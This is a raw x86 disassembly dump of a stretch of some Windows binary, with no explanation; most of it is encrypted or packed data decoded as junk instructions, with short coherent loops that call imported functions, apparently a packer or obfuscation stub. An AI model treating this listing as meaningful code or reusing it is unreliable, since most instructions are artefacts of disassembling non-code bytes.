  41283c:	dec    ecx
  41283d:	mov    WORD PTR [eax+0x21],cs
  412840:	inc    ebx
  412841:	sbb    DWORD PTR [eax-0x66880a57],esp
  412847:	mov    eax,ds:0xf3a44185
  41284c:	sahf   
  41284d:	mov    ecx,0x8f79f521
  412852:	mov    ah,0x80
  412854:	xor    eax,0xa6dd8a8f
  412859:	cmp    al,0x2b
  41285b:	(bad)  
  41285c:	xchg   ecx,eax
  41285d:	push   ecx
  41285e:	push   ss
  41285f:	sub    ebx,ebx
  412861:	cmp    edi,0xa33fc29f
  412867:	shl    DWORD PTR ds:0xd08619d8,0xb7
  41286e:	je     0x41282d
  412870:	dec    ebx
  412871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412872:	and    ax,WORD PTR [esp+edx*8+0x2cb0c816]
  41287a:	and    ah,BYTE PTR [ebp+0x19]
  41287d:	pop    es
  41287e:	pusha  
  41287f:	cmp    al,0xb4
  412881:	loopne 0x41289b
  412883:	(bad)  
  412884:	out    dx,al
  412885:	ds pop ebp
  412887:	xor    eax,0x78553335
  41288c:	mov    bl,BYTE PTR [ebx+0x354c9ae9]
  412892:	add    esp,DWORD PTR [edx+0x3f1da19a]
  412898:	lea    esp,[eax-0x12]
  41289b:	jae    0x412843
  41289d:	jae    0x412847
  41289f:	(bad)  
  4128a0:	or     ah,BYTE PTR [esi+0x4a]
  4128a3:	out    dx,eax
  4128a4:	and    edi,DWORD PTR [edi+ebx*4]
  4128a7:	mov    WORD PTR [ecx],ss
  4128a9:	pop    ebp
  4128aa:	sub    cl,BYTE PTR ds:0x69678377
  4128b0:	or     DWORD PTR [ebp+eax*4+0xe53ca93],esi
  4128b7:	xor    ecx,DWORD PTR [edx-0x13e79dba]
  4128bd:	mov    eax,ds:0x88d97a69
  4128c2:	and    ebp,DWORD PTR [esi-0x13]
  4128c5:	int    0x15
  4128c7:	mov    al,ds:0x47952797
  4128cc:	pop    edx
  4128cd:	xor    DWORD PTR [eax-0x5a],ecx
  4128d0:	int    0x41
  4128d2:	dec    edi
  4128d3:	mov    ah,BYTE PTR [eax+esi*8]
  4128d6:	sub    DWORD PTR [edx-0x1873a2bc],eax
  4128dc:	xchg   ecx,eax
  4128dd:	jns    0x4128ec
  4128df:	aad    0x9c
  4128e1:	inc    edi
  4128e2:	mov    esi,0xcfdad8bb
  4128e7:	fbld   TBYTE PTR [edi]
  4128e9:	js     0x412916
  4128eb:	push   ebp
  4128ec:	sub    BYTE PTR [esi+eiz*1-0x4d],al
  4128f0:	adc    al,0x6d
  4128f2:	sub    eax,0x2cdab22e
  4128f7:	mov    al,ds:0xffac4858
  4128fc:	dec    ebp
  4128fd:	loopne 0x4128f7
  4128ff:	xchg   ebx,eax
  412900:	stos   BYTE PTR es:[edi],al
  412901:	iret   
  412902:	and    ah,dh
  412904:	sub    al,ah
  412906:	popf   
  412907:	or     eax,0x3afa1298
  41290c:	mov    ebp,0xa69ca85e
  412911:	test   BYTE PTR [edx-0x443d8282],bl
  412917:	sbb    ebp,DWORD PTR [ebx]
  412919:	fisttp WORD PTR [esi+edx*1]
  41291c:	outs   dx,BYTE PTR ds:[esi]
  41291d:	and    DWORD PTR ds:0x993533c,ecx
  412923:	mov    dh,0x9a
  412925:	jae    0x41291d
  412927:	sub    edx,DWORD PTR [eax+0x143bfe69]
  41292d:	pop    es
  41292e:	(bad)  [edx]
  412930:	retf   
  412931:	cmc    
  412932:	and    BYTE PTR [edx],0xa
  412935:	ja     0x412973
  412937:	pusha  
  412938:	mul    BYTE PTR [ebp-0x59]
  41293b:	mov    esi,0x70284f1f
  412940:	cdq    
  412941:	mov    edi,0xcbf5a97b
  412946:	repnz repz xchg ecx,eax
  412949:	xlat   BYTE PTR ds:[ebx]
  41294a:	add    BYTE PTR [edx+0x12cfc379],ch
  412950:	xchg   ecx,eax
  412951:	rcr    BYTE PTR [eax+0x5e],0x18
  412955:	outs   dx,DWORD PTR ds:[esi]
  412956:	mov    bh,0x7a
  412958:	daa    
  412959:	add    BYTE PTR [eax-0x46141737],0xe9
  412960:	sub    al,0xb5
  412962:	or     BYTE PTR [edx],0x1
  412965:	cli    
  412966:	retf   
  412967:	imul   ebp,edx,0xffffff83
  41296a:	or     ebp,DWORD PTR [edi-0x71]
  41296d:	sub    ch,dl
  41296f:	into   
  412970:	enter  0x37dd,0x97
  412974:	push   ebx
  412975:	push   ecx
  412976:	lods   al,BYTE PTR ds:[esi]
  412977:	mov    bl,0x30
  412979:	and    eax,0x5a24e51a
  41297e:	lahf   
  41297f:	nop
  412980:	lea    esp,[ecx]
  412982:	adc    DWORD PTR [edi+0x50],esi
  412985:	arpl   WORD PTR [ebx-0x5c],bp
  412988:	push   ecx
  412989:	arpl   WORD PTR [edi-0x76dd1185],bp
  41298f:	cmp    al,0x5d
  412991:	mov    ebp,0x850faaf0
  412996:	inc    esi
  412997:	arpl   WORD PTR [edx],ax
  412999:	inc    ebp
  41299a:	sub    ecx,DWORD PTR [ecx]
  41299c:	outs   dx,DWORD PTR ds:[esi]
  41299d:	xchg   BYTE PTR [esi+edi*1],ah
  4129a0:	stos   DWORD PTR es:[edi],eax
  4129a1:	sub    cl,ah
  4129a3:	xlat   BYTE PTR ds:[ebx]
  4129a4:	mov    bl,0x31
  4129a6:	sbb    BYTE PTR [di-0x10],ch
  4129aa:	push   cs
  4129ab:	sbb    edi,DWORD PTR [eax-0x3e]
  4129ae:	mov    eax,0xa9d3e2ab
  4129b3:	push   ebx
  4129b4:	mov    ds:0x3697405,eax
  4129b9:	or     DWORD PTR [ecx-0x394e1ea9],edi
  4129bf:	add    cl,BYTE PTR [edx+0x3b]
  4129c2:	(bad)  
  4129c3:	lds    ecx,FWORD PTR [edi+eax*1+0x62ecba55]
  4129ca:	sbb    esp,esp
  4129cc:	xchg   DWORD PTR [esi+0x10],edx
  4129cf:	xor    dh,bh
  4129d1:	sbb    bl,BYTE PTR [esi+0x45dd8d]
  4129d7:	clc    
  4129d8:	out    dx,eax
  4129d9:	fisubr WORD PTR [eax+0x41]
  4129dc:	iret   
  4129dd:	rcl    eax,0xec
  4129e0:	das    
  4129e1:	lock jmp FWORD PTR [esi-0x3e6ef0b7]
  4129e8:	push   esi
  4129e9:	iret   
  4129ea:	dec    ebx
  4129eb:	scas   eax,DWORD PTR es:[edi]
  4129ec:	out    dx,al
  4129ed:	retf   
  4129ee:	hlt    
  4129ef:	mov    ss,edx
  4129f1:	cwde   
  4129f2:	inc    edi
  4129f3:	test   DWORD PTR [esi-0x72],esp
  4129f6:	(bad)  
  4129f7:	in     al,0xa9
  4129f9:	loope  0x412a27
  4129fb:	inc    esi
  4129fc:	imul   ebx,DWORD PTR [ebx+ebx*4],0x1b
  412a00:	sub    DWORD PTR [esp+eiz*8],esp
  412a03:	outs   dx,DWORD PTR ds:[esi]
  412a04:	in     al,dx
  412a05:	dec    esi
  412a06:	adc    bh,al
  412a08:	jne    0x412a6e
  412a0a:	je     0x412995
  412a0c:	xchg   esp,eax
  412a0d:	test   BYTE PTR [eax+0x50fa3fc],bl
  412a13:	cmp    al,0xd7
  412a15:	fwait
  412a16:	mul    DWORD PTR ds:0xf0111a68
  412a1c:	stc    
  412a1d:	idiv   DWORD PTR [ecx-0x47ff20fd]
  412a23:	test   al,0x6a
  412a25:	fsubrp st(2),st
  412a27:	ins    BYTE PTR es:[edi],dx
  412a28:	fld    TBYTE PTR [eax-0x51aa5a72]
  412a2e:	sahf   
  412a2f:	or     BYTE PTR [ecx],ah
  412a31:	push   cs
  412a32:	push   esp
  412a33:	adc    cl,BYTE PTR [edx-0x3c]
  412a36:	push   0x4a
  412a38:	shl    DWORD PTR [edi-0x5f],cl
  412a3b:	dec    edx
  412a3c:	ja     0x4129c3
  412a3e:	inc    edx
  412a3f:	mov    al,ds:0xc7f7cbc8
  412a44:	(bad)  
  412a45:	push   ebx
  412a46:	out    dx,eax
  412a47:	mov    ds:0xfc470c5c,al
  412a4c:	cwde   
  412a4d:	push   ecx
  412a4e:	xchg   edi,eax
  412a4f:	and    DWORD PTR [eax-0x12],esp
  412a52:	sbb    ecx,DWORD PTR [ebp*8-0x2ba89572]
  412a59:	stc    
  412a5a:	xlat   BYTE PTR ds:[ebx]
  412a5b:	xchg   ebx,eax
  412a5c:	jg     0x4129f2
  412a5e:	xchg   edx,eax
  412a5f:	out    0x43,al
  412a61:	aam    0x73
  412a63:	fwait
  412a64:	ss jp  0x412ad6
  412a67:	mov    ah,0xa1
  412a69:	sbb    al,0x99
  412a6b:	mov    gs:0xfc07d4bb,al
  412a71:	rcl    BYTE PTR [ebp+0x71],cl
  412a74:	inc    esi
  412a75:	out    0x93,al
  412a77:	inc    esi
  412a78:	inc    edx
  412a79:	jmp    0xd3042da0
  412a7e:	dec    ebp
  412a7f:	idiv   ebx
  412a81:	cmp    BYTE PTR [esi-0x2b],0xd5
  412a85:	jae    0x412ad9
  412a87:	mov    DWORD PTR [ebx],esi
  412a89:	lahf   
  412a8a:	shl    BYTE PTR [eax-0x6b],1
  412a8d:	inc    eax
  412a8e:	fwait
  412a8f:	mov    ah,0xf
  412a91:	test   BYTE PTR [eax],dl
  412a93:	add    BYTE PTR [eax],al
  412a95:	add    BYTE PTR [ebx+0x3d03144d],cl
  412a9b:	and    cl,ah
  412a9d:	inc    edx
  412a9e:	add    BYTE PTR [ebx-0x7609f4f7],cl
  412aa4:	dec    ebp
  412aa5:	in     al,0xc7
  412aa7:	add    eax,0x42fcf5
  412aac:	pop    ss
  412aad:	add    BYTE PTR [eax],al
  412aaf:	add    BYTE PTR [ebx+0x42fcf53d],al
  412ab5:	add    BYTE PTR [eax],al
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fcf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e317
  412af1:	mov    edi,DWORD PTR ds:0x42fcf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fcf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e128
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e118,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b3c
  412b3b:	fdivr  DWORD PTR [eax+0x70661186]
  412b41:	jo     0x412afc
  412b43:	jle    0x412bb5
  412b45:	jo     0x412b62
  412b47:	das    
  412b48:	push   ds
  412b49:	mov    edi,0x9ef85d10
  412b4e:	pusha  
  412b4f:	arpl   WORD PTR [edi+0x46],si
  412b52:	inc    ebp
  412b53:	cmp    ch,cl
  412b55:	push   edx
  412b56:	inc    esi
  412b57:	icebp  
  412b58:	dec    ecx
  412b59:	and    DWORD PTR [ebp-0x28cfcf71],esp
  412b5f:	fs daa 
  412b61:	push   edx
  412b62:	add    al,al
  412b64:	call   0x7920:0xd6ed40d3
  412b6b:	xor    DWORD PTR [esi-0x11],0xffffff83
  412b6f:	repz fstp st(1)
  412b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b73:	int3   
  412b74:	mov    edi,0x40e33d9
  412b79:	push   0xbe5c89be
  412b7e:	jne    0x412b08
  412b80:	sbb    edi,edx
  412b82:	push   ds
  412b83:	cwde   
  412b84:	in     eax,0x36
  412b86:	cmp    al,0x48
  412b88:	or     eax,0xecf4749
  412b8d:	jle    0x412b13
  412b8f:	adc    cl,dl
  412b91:	xor    edi,DWORD PTR ds:0x6c391146
  412b97:	inc    esp
  412b98:	mov    edx,0xf84fbc54
  412b9d:	(bad)  
  412b9f:	sub    eax,0x49f8a577
  412ba4:	push   ds
  412ba5:	sbb    BYTE PTR [esi],dl
  412ba7:	enter  0xb08a,0x74
  412bab:	mov    ch,0xc
  412bad:	inc    ebx
  412bae:	nop
  412baf:	ret    0xcf6b
  412bb2:	push   ebx
  412bb3:	mov    ecx,0xd2c416f3
  412bb8:	jg     0x412b63
  412bba:	into   
  412bbb:	cwde   
  412bbc:	or     bl,BYTE PTR [ebp-0x723bd6a8]
  412bc2:	neg    esi
  412bc4:	mov    ds:0x6d40a60b,eax
  412bc9:	xchg   edi,eax
  412bca:	push   eax
  412bcb:	xchg   ebp,eax
  412bcc:	retf   0xfdfb
  412bcf:	in     al,0xf3
  412bd1:	mov    WORD PTR [eax+0x1bbc6df2],es
  412bd7:	neg    BYTE PTR [ebp-0x28]
  412bda:	and    edi,DWORD PTR [edi-0x4d]
  412bdd:	pop    esi
  412bde:	fcomp  QWORD PTR ds:0xcc9511c6
  412be4:	cmp    eax,0x40b0618e
  412be9:	or     eax,ebp
  412beb:	and    bl,BYTE PTR [esi+eax*4+0x62d4f563]
  412bf2:	push   ebp
  412bf3:	dec    ebx
  412bf4:	push   ecx
  412bf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bf6:	dec    edx
  412bf7:	cli    
  412bf8:	mov    al,0xf0
  412bfa:	mov    ds:0x47738500,al
  412bff:	inc    ebp
  412c00:	pop    esi
  412c01:	icebp  
  412c02:	rcr    DWORD PTR [edi],cl
  412c04:	js     0x412bc2
  412c06:	inc    ebp
  412c07:	push   0xbf95422
  412c0c:	cdq    
  412c0d:	pop    ds
  412c0e:	mov    ebp,0xe6c0247e
  412c13:	adc    BYTE PTR [ecx+0x47eff381],ah
  412c19:	out    dx,eax
  412c1a:	call   0x931a:0x8e738805
  412c21:	fisttp QWORD PTR [edx+edi*1]
  412c24:	push   ebx
  412c25:	or     bl,BYTE PTR [edi+ebp*8+0x2e]
  412c29:	dec    edx
  412c2a:	mov    WORD PTR [esi],fs
  412c2c:	ret    0x942c
  412c2f:	mov    eax,0x2dd6b82f
  412c34:	sub    esi,esp
  412c36:	lock test al,0x11
  412c39:	adc    dl,bh
  412c3b:	push   ss
  412c3c:	stos   DWORD PTR es:[edi],eax
  412c3d:	jnp    0x412c9e
  412c3f:	imul   edi,DWORD PTR [edi-0x71b475f7],0x4773be2
  412c49:	je     0x412be5
  412c4b:	int3   
  412c4c:	stc    
  412c4d:	in     al,0x7b
  412c4f:	rcr    DWORD PTR [esi],1
  412c51:	mov    eax,ds:0x4a214ecb
  412c56:	hlt    
  412c57:	jge    0x412c58
  412c59:	or     edi,DWORD PTR [edi-0x1]
  412c5c:	lock mov ebp,DWORD PTR [ecx+0x5d]
  412c60:	mov    ss,WORD PTR [esi-0x250f5061]
  412c66:	push   ecx
  412c67:	push   eax
  412c68:	lods   al,BYTE PTR ds:[esi]
  412c69:	not    DWORD PTR [ebp+0x4a6b4d06]
  412c6f:	jmp    FWORD PTR [esi*1-0x92c23ff]
  412c76:	sub    esp,DWORD PTR [edi]
  412c78:	inc    esp
  412c79:	repnz add BYTE PTR [edi],0x1c
  412c7d:	cmp    BYTE PTR [ebp-0x4ec5b45c],cl
  412c83:	lahf   
  412c84:	sub    eax,0x57339761
  412c89:	sbb    ch,BYTE PTR [ecx]
  412c8b:	xor    DWORD PTR [edx+0x379d91dd],0x7221ca77
  412c95:	push   ebx
  412c96:	mov    eax,gs
  412c98:	lods   al,BYTE PTR ds:[esi]
  412c99:	cmp    edx,DWORD PTR [edi]
  412c9b:	adc    DWORD PTR [ebp+0x19a0a4ac],eax
  412ca1:	je     0x412cb9
  412ca3:	pushf  
  412ca4:	fincstp 
  412ca6:	bound  ecx,QWORD PTR [ecx]
  412ca8:	test   BYTE PTR [edx+0x17],0x42
  412cac:	mov    dl,0x93
  412cae:	out    dx,al
  412caf:	(bad)  
  412cb0:	and    dh,ah
  412cb2:	lea    esp,[esi+0x29]
  412cb5:	jmp    0x8d591bbe
  412cba:	inc    ebp
  412cbb:	cli    
  412cbc:	jp     0x412c46
  412cbe:	sbb    eax,0xcbda7855
  412cc3:	fist   DWORD PTR gs:[edx-0x66]
  412cc7:	iret   
  412cc8:	sub    BYTE PTR [edx+ebx*8-0x441fbfd0],ah
  412ccf:	jp     0x412cea
  412cd1:	sbb    DWORD PTR [ecx],eax
  412cd3:	or     dl,0x52
  412cd6:	jbe    0x412cb6
  412cd8:	adc    al,0xbd
  412cda:	inc    esi
  412cdc:	cmp    eax,0x8ec12de7
  412ce1:	jno    0x412d4e
  412ce3:	pop    ebp
  412ce4:	xlat   BYTE PTR ds:[ebx]
  412ce5:	js     0x412cc9
  412ce7:	and    ecx,DWORD PTR ds:[ebx-0x354be8a0]
  412cee:	mov    ?,WORD PTR [ebx+0x70c48d89]
  412cf4:	dec    ebx
  412cf5:	jge    0x412ccf
  412cf7:	jno    0x412d44
  412cf9:	push   0x5c
  412cfb:	mov    ch,0xef
  412cfd:	into   
  412cfe:	cmp    DWORD PTR [esi-0x2d6eca84],esp
  412d04:	(bad)  [esi]
  412d06:	dec    ah
  412d08:	mov    bh,0xda
  412d0a:	popa   
  412d0b:	stos   BYTE PTR es:[edi],al
  412d0c:	mov    ecx,0xccd1eab5
  412d11:	pop    eax
  412d12:	lds    ecx,FWORD PTR [eax]
  412d14:	fild   WORD PTR fs:[edx-0x3dfdbe79]
  412d1b:	xor    al,0xb1
  412d1d:	sub    BYTE PTR [ebx-0x67f4ccb2],bh
  412d23:	ds pop ds
  412d25:	ror    DWORD PTR [eax+0x25435afd],cl
  412d2b:	nop
  412d2c:	cmp    eax,0xeb83d0bf
  412d31:	sbb    ecx,DWORD PTR [edi-0x26d4e87]
  412d37:	ins    DWORD PTR es:[edi],dx
  412d38:	dec    edi
  412d39:	inc    ecx
  412d3a:	fs mov dl,0x65
  412d3d:	in     al,dx
  412d3e:	jo     0x412d9e
  412d40:	and    BYTE PTR [edx-0x39],dh
  412d43:	iret   
  412d44:	push   ds
  412d45:	sbb    al,0x4a
  412d47:	jle    0x412daa
  412d49:	mov    eax,ds:0x9fdb7977
  412d4e:	push   ebp
  412d4f:	in     al,0xfd
  412d51:	push   0xffffffdf
  412d53:	xchg   esp,eax
  412d54:	mov    BYTE PTR [ebx],ah
  412d56:	test   BYTE PTR [ecx-0x3a],0xb7
  412d5a:	xchg   esp,eax
  412d5b:	mov    ebp,0x957e6a5e
  412d60:	xchg   esi,eax
  412d61:	pop    ebx
  412d62:	jp     0x412d9a
  412d64:	dec    ebp
  412d65:	stc    
  412d66:	dec    edi
  412d67:	rcl    BYTE PTR [eax],1
  412d69:	push   ecx
  412d6a:	rol    DWORD PTR [edx+0x5d],0xcb
  412d6e:	cmp    DWORD PTR [ebp+0x39],ebp
  412d71:	sub    eax,0x729475fb
  412d76:	sbb    al,0x5c
  412d78:	in     al,0xc7
  412d7a:	outs   dx,BYTE PTR ds:[esi]
  412d7b:	aas    
  412d7c:	cmp    BYTE PTR [esi+0x2c],ch
  412d7f:	jle    0x412d29
  412d81:	pushf  
  412d82:	pusha  
  412d83:	pop    edi
  412d84:	stos   BYTE PTR es:[edi],al
  412d85:	clc    
  412d86:	push   es
  412d87:	pop    ecx
  412d88:	aad    0xfe
  412d8a:	push   es
  412d8b:	xchg   ebx,eax
  412d8d:	cdq    
  412d8e:	test   eax,0xd23329d7
  412d93:	xor    esi,DWORD PTR [ebx-0x708562a2]
  412d99:	xchg   esp,eax
  412d9a:	xor    bl,BYTE PTR [eax-0x78]
  412d9d:	xchg   ecx,eax
  412d9e:	std    
  412d9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412da0:	push   esp
  412da1:	popf   
  412da2:	inc    edi
  412da3:	pop    ebx
  412da4:	sub    al,0x41
  412da6:	mov    dh,0xa
  412da8:	lahf   
  412da9:	pop    edi
  412daa:	in     eax,dx
  412dab:	mov    gs,WORD PTR [edx]
  412dad:	daa    
  412dae:	add    dl,BYTE PTR [ebx]
  412db0:	mov    ah,BYTE PTR [edi-0x6d]
  412db3:	xchg   esp,eax
  412db4:	add    bh,0xe9
  412db7:	icebp  
  412db8:	loop   0x412de7
  412dba:	mov    ch,0xc3
  412dbc:	xor    eax,0x1860ec2e
  412dc1:	mov    esi,ss
  412dc3:	cmp    al,0x67
  412dc5:	or     bl,ah
  412dc7:	mov    eax,ds:0x707836c3
  412dcc:	sahf   
  412dcd:	dec    edx
  412dce:	add    al,0x51
  412dd0:	lock dec ebx
  412dd2:	lock int3 
  412dd4:	sar    DWORD PTR [esp+edx*8+0x754a47ec],cl
  412ddb:	xor    edx,0xffffffc2
  412dde:	sub    esi,DWORD PTR [eax+eiz*4-0x45]
  412de2:	in     al,dx
  412de3:	mov    es,esp
  412de5:	gs ffree st(5)
  412de8:	(bad)  
  412dea:	out    0xf6,eax
  412dec:	stos   DWORD PTR es:[edi],eax
  412ded:	in     eax,dx
  412dee:	xchg   ebx,eax
  412def:	mov    ds:0xd8adf5d3,al
  412df4:	(bad)  
  412df5:	ror    BYTE PTR [edx-0x3a],1
  412df8:	aad    0xa9
  412dfa:	sbb    DWORD PTR [ecx+0x6ede3521],edx
  412e00:	fdiv   st(0),st
  412e02:	psrlq  mm5,QWORD PTR [ebp+0x3e]
  412e06:	repnz or eax,0xb58fa95f
  412e0c:	dec    ecx
  412e0d:	xchg   esi,ecx
  412e0f:	and    DWORD PTR ds:0x42e11c,0x0
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e11c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e11c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e11c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e11c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e487
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [eax+ebp*1],si
  412e77:	pop    esi
  412e78:	je     0x412ed4
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0x5c70707e
  412e82:	cmp    bh,cl
  412e84:	js     0x412eb6
  412e86:	dec    BYTE PTR [ebp+0x4b06a9a2]
  412e8c:	idiv   ch
  412e8e:	pushf  
  412e8f:	test   BYTE PTR [esi],0xde
  412e92:	jb     0x412e3e
  412e94:	or     al,0x88
  412e96:	pushf  
  412e97:	jb     0x412eca
  412e99:	ds nop
  412e9b:	sub    eax,0xa5c751a5
  412ea0:	push   cs
  412ea1:	cmp    ch,BYTE PTR [esi-0x5a]
  412ea4:	ds cmp ch,cl
  412ea7:	int    0x78
  412ea9:	out    dx,al
  412eaa:	push   ebx
  412eab:	pmullw mm1,QWORD PTR [esi-0x40e21f77]
  412eb2:	adc    edi,DWORD PTR [esi-0x30a06690]
  412eb8:	leave  
  412eb9:	arpl   WORD PTR [ecx-0x5e604ae],di
  412ebf:	inc    edx
  412ec0:	and    DWORD PTR [edx-0x681cc4b7],ebp
  412ec6:	mov    eax,0x5a8a8537
  412ecb:	mov    ch,0xcc
  412ecd:	mov    ebx,0x3625806e
  412ed2:	xchg   BYTE PTR [ecx],dh
  412ed4:	iret   
  412ed5:	or     eax,0x5bb34782
  412eda:	test   DWORD PTR [edi-0xc6cbea7],ebx
  412ee0:	aas    
  412ee1:	push   ebx
  412ee2:	stos   BYTE PTR es:[edi],al
  412ee3:	adc    BYTE PTR [ecx-0x6de21a77],0x92
  412eea:	sbb    DWORD PTR [ecx+0x4e6e2c73],ecx
  412ef0:	or     cl,BYTE PTR [edi]
  412ef2:	xchg   edx,eax
  412ef3:	cmp    eax,0xe31809cc
  412ef8:	scas   eax,DWORD PTR es:[edi]
  412ef9:	pop    edx
  412efa:	jle    0x412f72
  412efc:	cmp    ah,0x38
  412eff:	adc    esp,ebx
  412f01:	mul    BYTE PTR [ebx+eiz*8]
  412f04:	arpl   WORD PTR [ebx+ebp*1-0x25],sp
  412f08:	sbb    DWORD PTR fs:[esi+0x4],esp
  412f0c:	mov    ds:0x16702f95,al
  412f11:	nop
  412f12:	std    
  412f13:	pop    ss
  412f14:	push   eax
  412f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f16:	or     BYTE PTR [ebx-0x3522b42],ch
  412f1c:	and    eax,0x7f3bb06b
  412f21:	sub    ebp,0xf712e93a
  412f27:	adc    eax,0x5e1b595d
  412f2c:	(bad)  [ecx+0x6e]
  412f2f:	call   0xd5cd36f9
  412f34:	leave  
  412f35:	mov    bh,0x9c
  412f37:	mov    bh,0x91
  412f39:	push   edi
  412f3a:	add    DWORD PTR ds:0xc111c037,esi
  412f40:	fistp  WORD PTR [eax+0x4e6ea791]
  412f46:	lods   eax,DWORD PTR ds:[esi]
  412f47:	cmp    al,BYTE PTR [ebx-0x11]
  412f4a:	pop    es
  412f4b:	rcl    ah,1
  412f4d:	push   eax
  412f4e:	adc    ch,bh
  412f50:	pop    edx
  412f51:	cmp    eax,0x50fa9b54
  412f56:	mov    dh,0x70
  412f58:	add    esi,ebx
  412f5a:	xchg   edx,eax
  412f5b:	dec    ebx
  412f5c:	fdivr  DWORD PTR [ebx+edi*4+0x5bb85d5b]
  412f63:	test   ch,bl
  412f65:	call   0xf0dc:0x2135ac8c
  412f6c:	scas   eax,DWORD PTR es:[edi]
  412f6d:	mov    ebp,0x23c72a9b
  412f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f73:	lahf   
  412f74:	test   ah,0xb2
  412f77:	push   cs
  412f78:	popa   
  412f79:	(bad)  
  412f7a:	dec    edi
  412f7b:	stos   DWORD PTR es:[edi],eax
  412f7c:	js     0x412f80
  412f7e:	pusha  
  412f7f:	aaa    
  412f80:	ds ror al,0x4d
  412f84:	mov    ds:0xbd5d4679,eax
  412f89:	or     esp,DWORD PTR [edx-0x48]
  412f8c:	test   BYTE PTR [esi+0x7f],bh
  412f8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f90:	fisubr WORD PTR [esi-0x1f]
  412f93:	lahf   
  412f94:	jbe    0x412fec
  412f96:	add    bl,BYTE PTR [ecx-0x19]
  412f99:	retf   0x19a3
  412f9c:	leave  
  412f9d:	pop    esp
  412f9e:	mov    DWORD PTR [ecx-0x32],0x1ce76d0d
  412fa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fa6:	mov    bh,0xc6
  412fa8:	sub    ebx,DWORD PTR [eax+0x34bd147c]
  412fae:	mov    BYTE PTR [esi],dl
  412fb0:	jne    0x412f36
  412fb2:	cli    
  412fb3:	mov    eax,DWORD PTR [ebp-0x491a3dd7]
  412fb9:	jo     0x412f7a
  412fbb:	mov    edi,0xafc20ce0
  412fc0:	sahf   
  412fc1:	add    al,0x5f
  412fc3:	es jno 0x413019
  412fc6:	sbb    DWORD PTR [ebx],ebx
  412fc8:	push   cs
  412fc9:	and    BYTE PTR [ecx+esi*1+0x66],al
  412fcd:	fiadd  DWORD PTR [ebx+0x109950f4]
  412fd3:	mov    edi,0x7eb5acd3
  412fd8:	mov    al,ds:0xad0b04f9
  412fdd:	inc    BYTE PTR [esp+eax*4-0x29]
  412fe1:	aas    
  412fe2:	cmp    eax,0x27bb503c
  412fe7:	stos   DWORD PTR es:[edi],eax
  412fe8:	jl     0x413022
  412fea:	hlt    
  412feb:	inc    edi
  412fec:	cld    
  412fed:	rcr    DWORD PTR [ebp+0x64],1
  412ff0:	sub    dl,BYTE PTR [esi-0x2f]
  412ff3:	or     eax,0xc314e9cc
  412ff8:	sub    DWORD PTR [eax+0x3fb06fb9],edi
  412ffe:	iret   
  412fff:	pop    ebp
  413000:	(bad)  
  413001:	sub    DWORD PTR cs:[ebx],ecx
  413004:	ins    BYTE PTR es:[edi],dx
  413005:	aas    
  413006:	cld    
  413007:	push   ss
  413008:	ret    
  413009:	jecxz  0x41302d
  41300b:	pop    eax
  41300c:	or     ch,dl
  41300e:	sbb    DWORD PTR [edi],eax
  413010:	divps  xmm1,XMMWORD PTR [ecx]
  413013:	test   ecx,esi
  413015:	jecxz  0x412fd2
  413017:	nop
  413018:	push   eax
  413019:	lea    esp,[edi-0x604f6096]
  41301f:	jecxz  0x413016
  413021:	pusha  
  413022:	xchg   esp,eax
  413023:	loopne 0x413069
  413025:	fisub  WORD PTR [ecx-0x71]
  413028:	and    DWORD PTR [edi],ebp
  41302a:	rol    eax,0xe9
  41302d:	add    DWORD PTR [edi+0x25fc2c9b],esi
  413033:	fwait
  413034:	xchg   DWORD PTR es:[bp-0x66],eax
  413039:	jmp    FWORD PTR ss:[ebx-0x309fc707]
  413040:	push   ss
  413041:	add    eax,0xa273238b
  413046:	aas    
  413047:	pushf  
  413048:	lods   al,BYTE PTR ds:[esi]
  413049:	push   esi
  41304a:	sub    BYTE PTR ds:0xce1e0456,cl
  413050:	repz pop esi
  413052:	pop    edx
  413053:	aaa    
  413054:	or     DWORD PTR [edi+0x6f],eax
  413057:	aas    
  413058:	retf   
  413059:	or     al,0x28
  41305b:	sub    BYTE PTR [esi-0x3a],0xb3
  41305f:	loope  0x41302d
  413061:	loop   0x4130a9
  413063:	lea    ebp,[ebp+edi*1+0x52eb931c]
